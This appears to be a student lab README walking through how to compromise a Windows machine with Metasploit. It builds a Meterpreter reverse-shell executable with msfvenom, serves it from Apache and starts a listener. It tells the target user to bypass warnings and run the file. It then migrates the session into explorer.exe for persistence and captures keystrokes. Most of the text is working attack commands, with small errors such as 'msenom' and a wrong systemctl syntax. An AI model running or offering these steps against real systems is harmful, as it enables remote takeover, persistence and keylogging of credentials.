# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/6a5083d3-4018-4947-9ffe-4514d495cdaa)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/3c9d11f8-1405-47b1-86ef-01b0e2f98b32)




copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/5faf8ffb-edae-4335-adfa-a670872b0a96)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/d6c03950-6850-49c5-a394-e3262b5afe09)



Check the status of apache2
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/dddd9bf3-c9fc-4d00-a886-3bfa810671d6)



###Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/86851cd6-9edf-4b8d-8a8a-8501e1c5cf2f)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/b4e0b3a3-9f0e-4a94-81ba-ecd5b66bbfc0)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/e28df4ef-e42c-423a-92aa-f7625f4d7f0a)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/b9382142-3163-4d46-b680-7bdfa26f9c3e)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/f97b1777-43d4-49bd-b6b4-4a3fa8fdb8e0)



keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/MohammedFaizal05/Compromising-windows-using-Metasploit/assets/120553195/9eb827fc-fae8-4cc6-b620-a398c98ded2f)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
